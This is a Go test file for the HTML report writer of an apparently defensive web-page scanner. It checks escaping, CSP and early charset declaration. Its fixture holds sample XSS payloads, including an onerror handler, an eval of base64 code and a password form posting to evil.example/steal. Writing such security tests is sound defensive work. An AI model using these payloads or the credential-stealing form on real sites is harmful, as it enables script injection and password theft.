package report

import (
	"strings"
	"testing"

	"github.com/suseong41/suseong-html-analyzer/scanner"
)

const attackPage = `<!doctype html><html><body>
<a href="javascript:alert(1)">click</a>
<img src=x onerror=alert(1)>
<script>eval(atob("YWxlcnQoMSk="))</script>
<form action="https://evil.example/steal"><input type="password" name="pw"></form>
</body></html>`

// report를 스캐너로 다시 검사
func TestReportIsCleanUnderOurOwnScanner(t *testing.T) {
	res := scanner.ScanURL(attackPage, "https://attacker.example/")
	if len(res.Findings) == 0 {
		t.Fatal("표본에서 아무것도 안 나옴. - 표현이 잘못됨")
	}
	t.Logf("대상 페이지 발견 %d건", len(res.Findings))

	var out strings.Builder
	if err := WriteHTML(&out, "https://attacker.example/", res); err != nil {
		t.Fatal(err)
	}
	again := scanner.ScanURL(out.String(), "https://ourscanner.example/")
	for _, f := range again.Findings {
		t.Errorf("우리 리포트에서 발견: %s %s %q", f.Severity, f.Code, f.Evidence)
	}
}

func TestReportEscapesEvidence(t *testing.T) {
	res := scanner.Result{Findings: []scanner.Finding{{
		Code: "test", Title: "t", Evidence: `<img src=x onerror=alert(1)>`,
	}}}
	var out strings.Builder
	if err := WriteHTML(&out, "https://x.example/", res); err != nil {
		t.Fatal(err)
	}
	if strings.Contains(out.String(), "<img") {
		t.Error("증거의 마크업이 그대로 나옴")
	}
	if !strings.Contains(out.String(), "&lt;img") {
		t.Error("이스케이프된 형태가 안 보인다")
	}
}

func TestReportEscapesURL(t *testing.T) {
	var out strings.Builder
	if err := WriteHTML(&out, `<script>alert(1)</script>`, scanner.Result{}); err != nil {
		t.Fatal(err)
	}
	if strings.Contains(out.String(), "<script>alert") {
		t.Error("URL 자리로 스크립트가 들어감")
	}
}

func TestReportHasCSP(t *testing.T) {
	var out strings.Builder
	WriteHTML(&out, "https://x.example/", scanner.Result{})
	if !strings.Contains(out.String(), "Content-Security-Policy") {
		t.Error("CSP가 없다")
	}
}

// charset 선언이 늦으면 브라우저가 문자셋을 추측 - UTF-7 우회
func TestReportDeclaresCharsetEarly(t *testing.T) {
	var out strings.Builder
	WriteHTML(&out, "https://x.example/", scanner.Result{})
	i := strings.Index(out.String(), `<meta charset="utf-8">`)
	if i < 0 {
		t.Fatal("charset 선언이 없다")
	}
	if 1024 <= i {
		t.Errorf("charset 선언이 %d바이트째 - 1024 안에 있어야 한다", i)
	}
}
